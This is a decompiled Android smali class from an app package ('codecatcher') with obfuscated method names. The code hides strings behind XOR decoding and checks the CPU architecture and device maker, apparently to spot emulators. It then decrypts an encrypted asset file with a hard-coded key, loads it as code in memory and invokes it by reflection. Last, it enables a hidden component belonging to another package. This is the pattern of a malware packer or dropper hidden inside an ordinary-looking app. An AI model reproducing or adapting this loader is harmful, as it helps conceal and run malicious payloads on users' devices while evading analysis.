.class public Lco/ec/cnsyn/codecatcher/ba5sou3sioz1kaiD;
.super Ljava/lang/Object;
.source "SourceFile"


# direct methods
.method public constructor <init>()V
    .registers 1

    .line 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static Aewaeyae8cahghae()Ljava/lang/String;
    .registers 11

    const/16 v0, 0xb

    .line 1
    new-array v0, v0, [B

    const/16 v1, 0x71

    const/4 v2, 0x0

    aput-byte v1, v0, v2

    const/4 v1, 0x1

    const/16 v3, -0x50

    aput-byte v3, v0, v1

    const/4 v3, 0x2

    const/16 v4, -0x67

    aput-byte v4, v0, v3

    const/16 v3, 0x2b

    const/4 v4, 0x3

    aput-byte v3, v0, v4

    const/4 v3, 0x4

    const/16 v5, -0x4a

    aput-byte v5, v0, v3

    const/4 v3, 0x5

    const/16 v5, -0x62

    aput-byte v5, v0, v3

    const/16 v3, 0x46

    const/4 v5, 0x6

    aput-byte v3, v0, v5

    const/4 v3, 0x7

    const/16 v6, -0x51

    aput-byte v6, v0, v3

    const/16 v3, 0x8

    const/16 v6, -0x53

    aput-byte v6, v0, v3

    const/16 v3, 0x4e

    const/16 v6, 0x9

    aput-byte v3, v0, v6

    const/16 v3, 0xa

    const/16 v7, -0x2e

    aput-byte v7, v0, v3

    const/16 v3, 0x10

    new-array v7, v3, [B

    fill-array-data v7, :array_68

    const/4 v8, 0x3

    :goto_46
    if-ge v8, v6, :cond_55

    add-int/lit8 v9, v8, -0x3

    rem-int/2addr v9, v3

    aget-byte v10, v0, v8

    aget-byte v9, v7, v9

    xor-int/2addr v9, v10

    int-to-byte v9, v9

    aput-byte v9, v0, v8

    add-int/2addr v8, v1

    goto :goto_46

    :cond_55
    new-array v3, v5, [B

    :goto_57
    if-ge v2, v5, :cond_61

    add-int v6, v4, v2

    aget-byte v6, v0, v6

    aput-byte v6, v3, v2

    add-int/2addr v2, v1

    goto :goto_57

    :cond_61
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, v3}, Ljava/lang/String;-><init>([B)V

    return-object v0

    nop

    :array_68
    .array-data 1
        0x53t
        -0x72t
        -0x58t
        0x19t
        -0x67t
        -0x67t
        -0x4ft
        0x64t
        -0x6t
        -0x10t
        -0x13t
        -0x34t
        0x2t
        0x66t
        -0x49t
        -0x3bt
    .end array-data
.end method

.method public static AiD7Sheghotoonoo()Ljava/lang/String;
    .registers 12

    const/16 v0, 0x1d

    .line 1
    new-array v0, v0, [B

    const/4 v1, 0x0

    const/16 v2, -0x67

    aput-byte v2, v0, v1

    const/4 v3, 0x1

    const/16 v4, -0x32

    aput-byte v4, v0, v3

    const/4 v4, 0x2

    aput-byte v2, v0, v4

    const/4 v2, 0x3

    const/16 v4, 0x65

    aput-byte v4, v0, v2

    const/4 v2, 0x4

    const/16 v4, 0x73

    aput-byte v4, v0, v2

    const/16 v5, 0x75

    const/4 v6, 0x5

    aput-byte v5, v0, v6

    const/4 v5, 0x6

    const/16 v7, -0x60

    aput-byte v7, v0, v5

    const/4 v5, 0x7

    const/16 v7, 0x1a

    aput-byte v7, v0, v5

    const/16 v5, 0x8

    const/16 v8, 0x21

    aput-byte v8, v0, v5

    const/16 v9, 0x9

    const/16 v10, -0x69

    aput-byte v10, v0, v9

    const/16 v9, 0xa

    const/16 v10, -0x3b

    aput-byte v10, v0, v9

    const/16 v9, 0xb

    const/16 v10, -0x68

    aput-byte v10, v0, v9

    const/16 v9, 0xc

    const/16 v10, -0x64

    aput-byte v10, v0, v9

    const/16 v9, 0xd

    const/16 v10, 0x69

    aput-byte v10, v0, v9

    const/16 v9, 0xe

    const/16 v10, -0x36

    aput-byte v10, v0, v9

    const/16 v9, 0xf

    const/16 v10, -0x2f

    aput-byte v10, v0, v9

    const/16 v9, 0x10

    aput-byte v8, v0, v9

    const/16 v8, 0x11

    const/16 v10, -0x46

    aput-byte v10, v0, v8

    const/16 v8, -0x6a

    const/16 v10, 0x12

    aput-byte v8, v0, v10

    const/16 v8, 0x13

    const/16 v11, -0xa

    aput-byte v11, v0, v8

    const/16 v8, 0x14

    aput-byte v4, v0, v8

    const/16 v4, 0x15

    const/16 v8, 0x6f

    aput-byte v8, v0, v4

    const/16 v4, 0x16

    aput-byte v6, v0, v4

    const/16 v6, 0x17

    aput-byte v5, v0, v6

    const/16 v5, 0x18

    const/16 v6, -0xb

    aput-byte v6, v0, v5

    const/16 v5, 0x19

    const/4 v6, -0x2

    aput-byte v6, v0, v5

    const/16 v5, -0x15

    aput-byte v5, v0, v7

    const/16 v5, 0x1b

    const/16 v6, 0x6c

    aput-byte v6, v0, v5

    const/16 v5, 0x1c

    const/16 v6, -0x7c

    aput-byte v6, v0, v5

    new-array v5, v9, [B

    fill-array-data v5, :array_c4

    const/4 v6, 0x4

    :goto_a3
    if-ge v6, v4, :cond_b2

    add-int/lit8 v7, v6, -0x4

    rem-int/2addr v7, v9

    aget-byte v8, v0, v6

    aget-byte v7, v5, v7

    xor-int/2addr v7, v8

    int-to-byte v7, v7

    aput-byte v7, v0, v6

    add-int/2addr v6, v3

    goto :goto_a3

    :cond_b2
    new-array v4, v10, [B

    :goto_b4
    if-ge v1, v10, :cond_be

    add-int v5, v2, v1

    aget-byte v5, v0, v5

    aput-byte v5, v4, v1

    add-int/2addr v1, v3

    goto :goto_b4

    :cond_be
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, v4}, Ljava/lang/String;-><init>([B)V

    return-object v0

    :array_c4
    .array-data 1
        0x1at
        0x1bt
        -0x2at
        0x75t
        0x4at
        -0xet
        -0x80t
        -0x20t
        -0x18t
        0xct
        -0x48t
        -0x41t
        0x40t
        -0x2at
        -0x21t
        -0x68t
    .end array-data
.end method

.method public static Oogh1shahsh7ojah()Ljava/lang/String;
    .registers 11

    const/16 v0, 0xf

    .line 1
    new-array v0, v0, [B

    const/16 v1, 0x55

    const/4 v2, 0x0

    aput-byte v1, v0, v2

    const/4 v1, 0x1

    const/16 v3, -0x9

    aput-byte v3, v0, v1

    const/4 v3, 0x2

    const/16 v4, 0xd

    aput-byte v4, v0, v3

    const/4 v3, 0x3

    const/16 v5, 0x8

    aput-byte v5, v0, v3

    const/16 v3, 0x6f

    const/4 v6, 0x4

    aput-byte v3, v0, v6

    const/4 v3, 0x5

    const/16 v7, -0x6a

    aput-byte v7, v0, v3

    const/4 v3, 0x6

    const/16 v7, -0x4a

    aput-byte v7, v0, v3

    const/16 v3, 0x6d

    const/4 v7, 0x7

    aput-byte v3, v0, v7

    const/16 v3, -0xf

    aput-byte v3, v0, v5

    const/16 v3, 0x9

    const/4 v5, -0x8

    aput-byte v5, v0, v3

    const/16 v3, 0xa

    const/16 v5, 0x76

    aput-byte v5, v0, v3

    const/16 v3, 0x75

    const/16 v5, 0xb

    aput-byte v3, v0, v5

    const/16 v3, 0xc

    aput-byte v2, v0, v3

    const/4 v3, -0x3

    aput-byte v3, v0, v4

    const/16 v3, 0xe

    const/16 v4, -0x51

    aput-byte v4, v0, v3

    const/16 v3, 0x10

    new-array v4, v3, [B

    fill-array-data v4, :array_78

    const/4 v8, 0x4

    :goto_56
    if-ge v8, v5, :cond_65

    add-int/lit8 v9, v8, -0x4

    rem-int/2addr v9, v3

    aget-byte v10, v0, v8

    aget-byte v9, v4, v9

    xor-int/2addr v9, v10

    int-to-byte v9, v9

    aput-byte v9, v0, v8

    add-int/2addr v8, v1

    goto :goto_56

    :cond_65
    new-array v3, v7, [B

    :goto_67
    if-ge v2, v7, :cond_71

    add-int v4, v6, v2

    aget-byte v4, v0, v4

    aput-byte v4, v3, v2

    add-int/2addr v2, v1

    goto :goto_67

    :cond_71
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, v3}, Ljava/lang/String;-><init>([B)V

    return-object v0

    nop

    :array_78
    .array-data 1
        0x3t
        -0x7t
        -0x29t
        0x9t
        -0x4bt
        -0x63t
        0xet
        0x15t
        -0x31t
        -0x6ft
        0x53t
        -0x1bt
        0x55t
        0x7bt
        -0x7bt
        -0x13t
    .end array-data
.end method

.method public static OuGhohso4ca4xee7()Z
    .registers 7

    .line 1
    sget-object v0, Landroid/os/Build;->CPU_ABI:Ljava/lang/String;

    invoke-static {}, Lco/ec/cnsyn/codecatcher/ba5sou3sioz1kaiD;->ieduyuFok9vongie()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    const/4 v2, 0x1

    if-nez v1, :cond_6a

    invoke-static {}, Lco/ec/cnsyn/codecatcher/ba5sou3sioz1kaiD;->Aewaeyae8cahghae()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_18

    goto :goto_6a

    :cond_18
    sget-object v0, Landroid/os/Build;->SUPPORTED_ABIS:[Ljava/lang/String;

    array-length v1, v0

    const/4 v3, 0x0

    const/4 v4, 0x0

    :goto_1d
    if-ge v4, v1, :cond_3a

    aget-object v5, v0, v4

    invoke-static {}, Lco/ec/cnsyn/codecatcher/ba5sou3sioz1kaiD;->ieduyuFok9vongie()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v6, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_39

    invoke-static {}, Lco/ec/cnsyn/codecatcher/ba5sou3sioz1kaiD;->Aewaeyae8cahghae()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v6, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_36

    goto :goto_39

    :cond_36
    add-int/lit8 v4, v4, 0x1

    goto :goto_1d

    :cond_39
    :goto_39
    return v2

    :cond_3a
    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    sget-object v1, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    invoke-virtual {v0, v1}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_6a

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_6a

    invoke-static {}, Lco/ec/cnsyn/codecatcher/ba5sou3sioz1kaiD;->yieCh1ie6ool6eiw()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_6a

    invoke-static {}, Lco/ec/cnsyn/codecatcher/ba5sou3sioz1kaiD;->bee5aijieb2uo2aZ()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_6a

    invoke-static {}, Lco/ec/cnsyn/codecatcher/ba5sou3sioz1kaiD;->eeR2zeishah7vohm()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_69

    goto :goto_6a

    :cond_69
    return v3

    :cond_6a
    :goto_6a
    return v2
.end method

.method public static Pieph1deinge3fo1(Ljava/io/InputStream;)[B
    .registers 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 1
    invoke-virtual {p0}, Ljava/io/InputStream;->available()I

    move-result v0

    new-array v0, v0, [B

    invoke-virtual {p0, v0}, Ljava/io/InputStream;->read([B)I

    invoke-virtual {p0}, Ljava/io/InputStream;->close()V

    invoke-static {v0}, Lco/ec/cnsyn/codecatcher/ba5sou3sioz1kaiD;->naeYoth3oocahqu0([B)V

    return-object v0
.end method

.method public static aow9cho1ahCoap4o(Landroid/content/Context;)V
    .registers 10

    const/4 v0, 0x0

    const/4 v1, 0x2

    const/4 v2, 0x1

    .line 1
    const-class v3, Ljava/lang/String;

    const-class v4, Landroid/content/Context;

    :try_start_7
    invoke-virtual {p0}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;

    invoke-virtual {p0}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v5

    invoke-static {v5}, Lco/ec/cnsyn/codecatcher/ba5sou3sioz1kaiD;->ohp9cee7ohth0Quu(Landroid/content/res/AssetManager;)[B

    move-result-object v5

    invoke-static {v5}, Ljava/nio/ByteBuffer;->wrap([B)Ljava/nio/ByteBuffer;

    move-result-object v5

    invoke-virtual {p0}, Landroid/content/Context;->getClassLoader()Ljava/lang/ClassLoader;

    move-result-object v6

    invoke-static {}, Lco/ec/cnsyn/codecatcher/aeP2aegem3ien3yi;->yieCh1ie6ool6eiw()V

    invoke-static {v5, v6}, Lco/ec/cnsyn/codecatcher/LaiW8neishov5phe;->yieCh1ie6ool6eiw(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)Ldalvik/system/InMemoryDexClassLoader;

    move-result-object v5

    invoke-static {}, Lco/ec/cnsyn/codecatcher/ba5sou3sioz1kaiD;->johP3iepo3obozaa()Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, Lco/ec/cnsyn/codecatcher/iepheiphee5gi9Ei;->yieCh1ie6ool6eiw(Ldalvik/system/InMemoryDexClassLoader;Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v5

    invoke-static {}, Lco/ec/cnsyn/codecatcher/ba5sou3sioz1kaiD;->Oogh1shahsh7ojah()Ljava/lang/String;

    move-result-object v6

    new-array v7, v1, [Ljava/lang/Class;

    aput-object v4, v7, v0

    aput-object v3, v7, v2

    invoke-virtual {v5, v6, v7}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v6

    new-array v7, v1, [Ljava/lang/Object;

    aput-object p0, v7, v0

    const-string v8, "sljlwp0nwlsnql1q/g9mxbcgv"

    aput-object v8, v7, v2

    const/4 v8, 0x0

    invoke-virtual {v6, v8, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {}, Lco/ec/cnsyn/codecatcher/ba5sou3sioz1kaiD;->AiD7Sheghotoonoo()Ljava/lang/String;

    move-result-object v6

    new-array v7, v1, [Ljava/lang/Class;

    aput-object v4, v7, v0

    aput-object v3, v7, v2

    invoke-virtual {v5, v6, v7}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    new-array v1, v1, [Ljava/lang/Object;

    aput-object p0, v1, v0

    const-string v0, "com.zmh.wkjwqvogg.App"

    aput-object v0, v1, v2

    invoke-virtual {v3, v8, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    new-instance v0, Landroid/content/ComponentName;

    const-string v1, "com.zmh.wkjwqvogg.ebCMUgoC"

    invoke-direct {v0, p0, v1}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object p0

    invoke-virtual {p0, v0, v2, v2}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
    :try_end_6a
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_6a} :catch_6b

    return-void

    :catch_6b
    move-exception p0

    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, p0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0
.end method

.method public static bee5aijieb2uo2aZ()Ljava/lang/String;
    .registers 11

    const/16 v0, 0x11

    .line 1
    new-array v0, v0, [B

    const/16 v1, 0x2a

    const/4 v2, 0x0

    aput-byte v1, v0, v2

    const/4 v1, 0x1

    const/16 v3, -0x55

    aput-byte v3, v0, v1

    const/4 v3, 0x2

    const/16 v4, -0xb

    aput-byte v4, v0, v3

    const/4 v3, 0x3

    const/16 v4, 0x2f

    aput-byte v4, v0, v3

    const/4 v3, 0x4

    const/16 v4, -0x4f

    aput-byte v4, v0, v3

    const/16 v3, 0x67

    const/4 v4, 0x5

    aput-byte v3, v0, v4

    const/4 v3, 0x6

    const/16 v5, 0x30

    aput-byte v5, v0, v3

    const/16 v3, 0x63

    const/4 v5, 0x7

    aput-byte v3, v0, v5

    const/16 v3, 0x8

    const/16 v6, -0x74

    aput-byte v6, v0, v3

    const/16 v3, 0x9

    const/16 v6, 0x12

    aput-byte v6, v0, v3

    const/16 v3, 0xa

    const/16 v6, -0x36

    aput-byte v6, v0, v3

    const/16 v3, 0xb

    const/16 v6, -0x80

    aput-byte v6, v0, v3

    const/16 v3, 0x15

    const/16 v6, 0xc

    aput-byte v3, v0, v6

    const/16 v3, 0xd

    const/16 v7, -0x7f

    aput-byte v7, v0, v3

    const/16 v3, 0xe

    const/16 v7, -0x63

    aput-byte v7, v0, v3

    const/16 v3, 0xf

    const/16 v7, -0x41

    aput-byte v7, v0, v3

    const/16 v3, -0x6b

    const/16 v7, 0x10

    aput-byte v3, v0, v7

    new-array v3, v7, [B

    fill-array-data v3, :array_8a

    const/4 v8, 0x5

    :goto_68
    if-ge v8, v6, :cond_77

    add-int/lit8 v9, v8, -0x5

    rem-int/2addr v9, v7

    aget-byte v10, v0, v8

    aget-byte v9, v3, v9

    xor-int/2addr v9, v10

    int-to-byte v9, v9

    aput-byte v9, v0, v8

    add-int/2addr v8, v1

    goto :goto_68

    :cond_77
    new-array v3, v5, [B

    :goto_79
    if-ge v2, v5, :cond_83

    add-int v6, v4, v2

    aget-byte v6, v0, v6

    aput-byte v6, v3, v2

    add-int/2addr v2, v1

    goto :goto_79

    :cond_83
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, v3}, Ljava/lang/String;-><init>([B)V

    return-object v0

    nop

    :array_8a
    .array-data 1
        0x12t
        0x5et
        0x8t
        -0x1et
        0x7dt
        -0x43t
        -0x12t
        0x7ft
        0x56t
        -0x61t
        -0x50t
        -0x4et
        0x3at
        -0x61t
        0x50t
        -0x3ct
    .end array-data
.end method

.method public static eeR2zeishah7vohm()Ljava/lang/String;
    .registers 11

    const/16 v0, 0x12

    .line 1
    new-array v0, v0, [B

    const/16 v1, -0x7f

    const/4 v2, 0x0

    aput-byte v1, v0, v2

    const/4 v1, 0x1

    const/16 v3, -0x5c

    aput-byte v3, v0, v1

    const/4 v3, 0x2

    const/16 v4, -0x16

    aput-byte v4, v0, v3

    const/16 v3, 0x2a

    const/4 v4, 0x3

    aput-byte v3, v0, v4

    const/4 v3, 0x4

    const/16 v5, 0x34

    aput-byte v5, v0, v3

    const/4 v3, 0x5

    const/16 v5, -0x3a

    aput-byte v5, v0, v3

    const/4 v3, 0x6

    const/16 v5, -0x44

    aput-byte v5, v0, v3

    const/16 v3, 0x1f

    const/4 v5, 0x7

    aput-byte v3, v0, v5

    const/16 v3, 0x8

    const/16 v6, 0x78

    aput-byte v6, v0, v3

    const/16 v3, 0x9

    const/16 v6, -0x37

    aput-byte v6, v0, v3

    const/16 v3, -0x3d

    const/16 v6, 0xa

    aput-byte v3, v0, v6

    const/16 v3, 0xb

    const/16 v7, -0xd

    aput-byte v7, v0, v3

    const/16 v3, 0xc

    const/16 v7, -0x60

    aput-byte v7, v0, v3

    const/16 v3, 0xd

    const/16 v7, 0x3e

    aput-byte v7, v0, v3

    const/16 v3, 0xe

    const/16 v7, 0x5e

    aput-byte v7, v0, v3

    const/16 v3, 0xf

    const/16 v7, 0x26

    aput-byte v7, v0, v3

    const/16 v3, -0x11

    const/16 v7, 0x10

    aput-byte v3, v0, v7

    const/16 v3, 0x11

    const/16 v8, -0x17

    aput-byte v8, v0, v3

    new-array v3, v7, [B

    fill-array-data v3, :array_90

    const/4 v8, 0x3

    :goto_6e
    if-ge v8, v6, :cond_7d

    add-int/lit8 v9, v8, -0x3

    rem-int/2addr v9, v7

    aget-byte v10, v0, v8

    aget-byte v9, v3, v9

    xor-int/2addr v9, v10

    int-to-byte v9, v9

    aput-byte v9, v0, v8

    add-int/2addr v8, v1

    goto :goto_6e

    :cond_7d
    new-array v3, v5, [B

    :goto_7f
    if-ge v2, v5, :cond_89

    add-int v6, v4, v2

    aget-byte v6, v0, v6

    aput-byte v6, v3, v2

    add-int/2addr v2, v1

    goto :goto_7f

    :cond_89
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, v3}, Ljava/lang/String;-><init>([B)V

    return-object v0

    nop

    :array_90
    .array-data 1
        0x4dt
        0x51t
        -0x58t
        -0x27t
        0x6dt
        0x11t
        -0x56t
        -0x3ft
        -0x6et
        0x76t
        0x75t
        -0x6bt
        -0x6dt
        -0x4et
        0x7at
        0x65t
    .end array-data
.end method

.method public static ieduyuFok9vongie()Ljava/lang/String;
    .registers 11

    const/16 v0, 0x8

    .line 1
    new-array v0, v0, [B

    const/16 v1, 0x30

    const/4 v2, 0x0

    aput-byte v1, v0, v2

    const/4 v1, 0x1

    const/16 v3, 0x14

    aput-byte v3, v0, v1

    const/4 v3, 0x2

    const/4 v4, 0x7

    aput-byte v4, v0, v3

    const/16 v5, -0x7f

    const/4 v6, 0x3

    aput-byte v5, v0, v6

    const/16 v5, 0x21

    const/4 v7, 0x4

    aput-byte v5, v0, v7

    const/16 v5, 0x23

    const/4 v8, 0x5

    aput-byte v5, v0, v8

    const/4 v5, 0x6

    aput-byte v7, v0, v5

    const/16 v5, -0x1d

    aput-byte v5, v0, v4

    const/16 v4, 0x10

    new-array v5, v4, [B

    fill-array-data v5, :array_52

    const/4 v7, 0x2

    :goto_30
    if-ge v7, v8, :cond_3f

    add-int/lit8 v9, v7, -0x2

    rem-int/2addr v9, v4

    aget-byte v10, v0, v7

    aget-byte v9, v5, v9

    xor-int/2addr v9, v10

    int-to-byte v9, v9

    aput-byte v9, v0, v7

    add-int/2addr v7, v1

    goto :goto_30

    :cond_3f
    new-array v4, v6, [B

    :goto_41
    if-ge v2, v6, :cond_4b

    add-int v5, v3, v2

    aget-byte v5, v0, v5

    aput-byte v5, v4, v2

    add-int/2addr v2, v1

    goto :goto_41

    :cond_4b
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, v4}, Ljava/lang/String;-><init>([B)V

    return-object v0

    nop

    :array_52
    .array-data 1
        0x7ft
        -0x47t
        0x17t
        0x4ft
        0x1at
        -0x5dt
        0x2ct
        -0x63t
        -0x7t
        0x48t
        -0x14t
        -0x4ct
        0x69t
        -0x5dt
        0x4at
        0x5et
    .end array-data
.end method

.method public static johP3iepo3obozaa()Ljava/lang/String;
    .registers 14

    const/16 v0, 0x3d

    .line 1
    new-array v0, v0, [B

    const/4 v1, 0x0

    const/16 v2, 0x4a

    aput-byte v2, v0, v1

    const/4 v3, 0x1

    const/16 v4, 0x42

    aput-byte v4, v0, v3

    const/4 v5, 0x2

    const/16 v6, -0x6c

    aput-byte v6, v0, v5

    const/4 v7, 0x3

    const/16 v8, -0x60

    aput-byte v8, v0, v7

    const/4 v7, 0x4

    const/16 v9, 0x5e

    aput-byte v9, v0, v7

    const/4 v7, 0x5

    const/16 v9, 0x17

    aput-byte v9, v0, v7

    const/4 v7, 0x6

    aput-byte v3, v0, v7

    const/4 v7, 0x7

    aput-byte v8, v0, v7

    const/16 v8, 0x8

    const/16 v10, 0x53

    aput-byte v10, v0, v8

    const/16 v8, 0x9

    const/16 v10, 0xe

    aput-byte v10, v0, v8

    const/16 v11, 0xa

    const/16 v12, -0x73

    aput-byte v12, v0, v11

    const/16 v11, 0xb

    const/16 v12, 0x1c

    aput-byte v12, v0, v11

    const/16 v11, 0xc

    const/16 v13, -0x38

    aput-byte v13, v0, v11

    const/16 v11, 0xd

    const/16 v13, -0x17

    aput-byte v13, v0, v11

    const/16 v11, -0x3c

    aput-byte v11, v0, v10

    const/16 v10, 0xf

    const/16 v11, 0x7e

    aput-byte v11, v0, v10

    const/16 v10, 0x10

    aput-byte v6, v0, v10

    const/16 v6, 0x11

    const/16 v11, 0x54

    aput-byte v11, v0, v6

    const/16 v6, 0x5c

    const/16 v11, 0x12

    aput-byte v6, v0, v11

    const/16 v6, 0x13

    const/16 v13, -0x61

    aput-byte v13, v0, v6

    const/16 v6, 0x14

    const/16 v13, 0x77

    aput-byte v13, v0, v6

    const/16 v6, 0x15

    const/16 v13, 0x4d

    aput-byte v13, v0, v6

    const/16 v6, 0x16

    const/16 v13, -0x76

    aput-byte v13, v0, v6

    const/16 v6, -0x50

    aput-byte v6, v0, v9

    const/16 v6, 0x18

    const/16 v13, 0x4f

    aput-byte v13, v0, v6

    const/16 v6, 0x19

    aput-byte v1, v0, v6

    const/16 v6, 0x1a

    const/16 v13, -0x3e

    aput-byte v13, v0, v6

    const/16 v6, 0x1b

    aput-byte v9, v0, v6

    const/16 v6, -0x2e

    aput-byte v6, v0, v12

    const/16 v6, 0x1d

    const/16 v9, -0xf

    aput-byte v9, v0, v6

    const/16 v6, 0x1e

    const/16 v9, -0x27

    aput-byte v9, v0, v6

    const/16 v6, 0x1f

    const/16 v9, 0x6f

    aput-byte v9, v0, v6

    const/16 v6, 0x20

    const/16 v9, -0x75

    aput-byte v9, v0, v6

    const/16 v6, 0x21

    aput-byte v4, v0, v6

    const/16 v4, 0x22

    aput-byte v10, v0, v4

    const/16 v4, 0x23

    const/16 v6, -0x7a

    aput-byte v6, v0, v4

    const/16 v4, 0x24

    const/16 v9, 0x71

    aput-byte v9, v0, v4

    const/16 v4, 0x25

    const/16 v9, 0x4b

    aput-byte v9, v0, v4

    const/16 v4, 0x26

    const/16 v9, -0x74

    aput-byte v9, v0, v4

    const/16 v4, 0x27

    const/16 v9, -0x49

    aput-byte v9, v0, v4

    const/16 v4, 0x28

    const/16 v9, 0x4e

    aput-byte v9, v0, v4

    const/16 v4, 0x29

    aput-byte v5, v0, v4

    const/16 v4, 0x2a

    const/16 v5, -0x2d

    aput-byte v5, v0, v4

    const/16 v4, 0x2b

    aput-byte v8, v0, v4

    const/16 v4, 0x2c

    const/16 v5, -0x2b

    aput-byte v5, v0, v4

    const/16 v4, 0x2d

    const/4 v5, -0x6

    aput-byte v5, v0, v4

    const/16 v4, 0x2e

    const/16 v5, -0x79

    aput-byte v5, v0, v4

    const/16 v4, 0x2f

    aput-byte v2, v0, v4

    const/16 v2, 0x30

    const/16 v4, -0x63

    aput-byte v4, v0, v2

    const/16 v2, 0x49

    const/16 v4, 0x31

    aput-byte v2, v0, v4

    const/16 v2, 0x32

    const/16 v5, 0x3e

    aput-byte v5, v0, v2

    const/16 v2, 0x33

    aput-byte v6, v0, v2

    const/16 v2, 0x34

    const/16 v5, 0x7f

    aput-byte v5, v0, v2

    const/16 v2, 0x35

    const/16 v5, 0x5b

    aput-byte v5, v0, v2

    const/16 v2, 0x36

    const/16 v5, -0x66

    aput-byte v5, v0, v2

    const/16 v2, 0x37

    const/16 v5, -0x4f

    aput-byte v5, v0, v2

    const/16 v2, -0x4e

    const/16 v5, 0x38

    aput-byte v2, v0, v5

    const/16 v2, 0x39

    aput-byte v11, v0, v2

    const/16 v2, 0x3a

    const/16 v6, -0x6d

    aput-byte v6, v0, v2

    const/16 v2, 0x3b

    const/16 v6, -0x16

    aput-byte v6, v0, v2

    const/16 v2, 0x3c

    const/16 v6, -0x36

    aput-byte v6, v0, v2

    new-array v2, v10, [B

    fill-array-data v2, :array_172

    const/4 v6, 0x7

    :goto_151
    if-ge v6, v5, :cond_160

    add-int/lit8 v8, v6, -0x7

    rem-int/2addr v8, v10

    aget-byte v9, v0, v6

    aget-byte v8, v2, v8

    xor-int/2addr v8, v9

    int-to-byte v8, v8

    aput-byte v8, v0, v6

    add-int/2addr v6, v3

    goto :goto_151

    :cond_160
    new-array v2, v4, [B

    :goto_162
    if-ge v1, v4, :cond_16c

    add-int v5, v7, v1

    aget-byte v5, v0, v5

    aput-byte v5, v2, v1

    add-int/2addr v1, v3

    goto :goto_162

    :cond_16c
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, v2}, Ljava/lang/String;-><init>([B)V

    return-object v0

    :array_172
    .array-data 1
        -0x3dt
        0x3ct
        0x63t
        -0x5dt
        0x79t
        -0x50t
        -0x78t
        -0x57t
        0xet
        -0x8t
        0x31t
        0x72t
        -0x17t
        0x1et
        0x3ft
        -0x1t
    .end array-data
.end method

.method public static naeYoth3oocahqu0([B)V
    .registers 5

    .line 1
    const-string v0, "ecwpcv70jcibydeqfhqqejz8lx34ey0t8fyvgbsxtrexltbf03lprqdzahlcoffu"

    sget-object v1, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v0, v1}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v0

    const/4 v1, 0x0

    :goto_9
    array-length v2, p0

    if-ge v1, v2, :cond_1a

    aget-byte v2, p0, v1

    array-length v3, v0

    rem-int v3, v1, v3

    aget-byte v3, v0, v3

    xor-int/2addr v2, v3

    int-to-byte v2, v2

    aput-byte v2, p0, v1

    add-int/lit8 v1, v1, 0x1

    goto :goto_9

    :cond_1a
    return-void
.end method

.method public static ohp9cee7ohth0Quu(Landroid/content/res/AssetManager;)[B
    .registers 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 1
    const-string v0, "zhxgj0tqqdmdct8o"

    invoke-virtual {p0, v0}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object p0

    invoke-static {p0}, Lco/ec/cnsyn/codecatcher/ba5sou3sioz1kaiD;->Pieph1deinge3fo1(Ljava/io/InputStream;)[B

    move-result-object p0

    return-object p0
.end method

